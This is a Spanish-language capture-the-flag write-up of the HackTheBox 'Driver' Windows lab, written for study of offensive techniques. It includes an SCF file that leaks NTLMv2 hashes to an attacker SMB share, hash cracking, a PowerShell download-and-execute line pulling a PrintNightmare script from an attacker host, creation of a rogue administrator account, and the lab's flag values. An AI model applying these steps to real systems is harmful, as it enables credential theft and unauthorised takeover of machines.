---
title: HackTheBox - Driver
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Windows, 'File Upload (scf)', 'PrintNightmare (CVE-2021-1675)']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Driver/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Driver Machine Logo
---

Máquina Windows de nivel **Easy** de HackTheBox.

Técnicas usadas: **File Upload (scf), PrintNightmare (CVE-2021-1675)**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Driver/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -p<Ports> -sC  <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Driver/02-versions.png)

c. Si vamos al sitio nos pedirá credenciales, y al no disponer de ninguna, usamos las más comunes **admin:admin, root:root, admin:password*

![](/assets/images/HTB/Easy/Driver/03-web.png)

* Cosas más importantes
    + [x] Podemos subir cualquier tipo de archivo.
    + [x] El mensaje en la página web nos dice que al momento de subir un fichero, el equipo de testing lo revisará.

Después de intentar subir múltiples ficheros y no conseguir nada, investigamos formas de obtener una reverse shell o credenciales de usuario.

> Los archivos [**.scf**](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) sirven para la configuración de la apariencia de Windows.
{: .prompt-info }

Subimos un fichero .scf con el siguiente contenido

```scf
[Shell]
Command=2
IconFile=\\<IP tun0>\share\favicon.ico
[Taskbar]
Command=ToggleDesktop
```

> En el momento en el que alguien acceda a este fichero, se emitirá una solicitud a un servidor que estará en nuestro control, aquí se producirá una autenticación y podremos el hash **NLTMv2** del usuario.
{: .prompt-tip }


Antes de subir el fichero montamos un **servidor SMB:** **`impacket-smbserver Share ./ -smb2support`**, ahora subimos el fichero .scf

![](/assets/images/HTB/Easy/Driver/04-smb.png)

Crackeamos el hash con **john** 

```bash
john hash -w=/usr/share/wordlists/rockyou.txt
liltony
```

d. Ahora, con las credenciales anteriores nos podemos conectar en el servicio **WinRM**

```bash
evil-winrm -i <IP Driver> -u 'tony' -p 'liltony'
```

### Escalada de Privilegios 💹

a. Subimos el script [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) para analizar posibles vectores de escalación de privilegios

```bash
*Evil-WinRM* PS C:\Users\tony> .\winPEASx64.exe

<SNIP>
Listening      1160            spoolsv
```

> El contexto de la Máquina va de impresoras, así que buscamos algo relacionado a este servicio e impresoras. [PrintNightmare](https://github.com/calebstewart/CVE-2021-1675)
{: .prompt-info }

b. Ahora, nos descargamos el script de Github y montamos un servidor con python **`python -m http.server 80`**. Ahora, desde evil-winrm realizamos una petición y ejecutamos el script directamente, todo esto con el fin de bypassear una restricción que se presenta al ejecutar el script

```powershell
*Evil-WinRM* PS C:\Users\tony> IEX(New-Object Net.WebClient).DownloadString('http://<IP tun0>/CVE-2021-1675.ps1')
```

* Ahora creamos un usuario el cual será añadido al grupo **Administrators**

    ```powershell
    *Evil-WinRM* PS C:\Users\tony> Invoke-Nightmare -DriverName "Xerox" -NewUser "estx" -NewPassword "estx@@"
    *Evil-WinRM* PS C:\Users> net localgroup Administrators
    Alias name     Administrators
    Comment        Administrators have complete and unrestricted access to the computer/domain
    Members
    -------------------------------------------------------------------------------
    Administrator
    estx
    ```

c. Estas credenciales nos sirven para conectarnos con evil-winrm

```bash
evil-winrm -i <IP Driver> -u 'estx' -p 'estx@@'

*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
b05bd2852ace7cda4c6e7f262e1930d9

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
84c4d9cd404904925830d6ac28b7ec33
```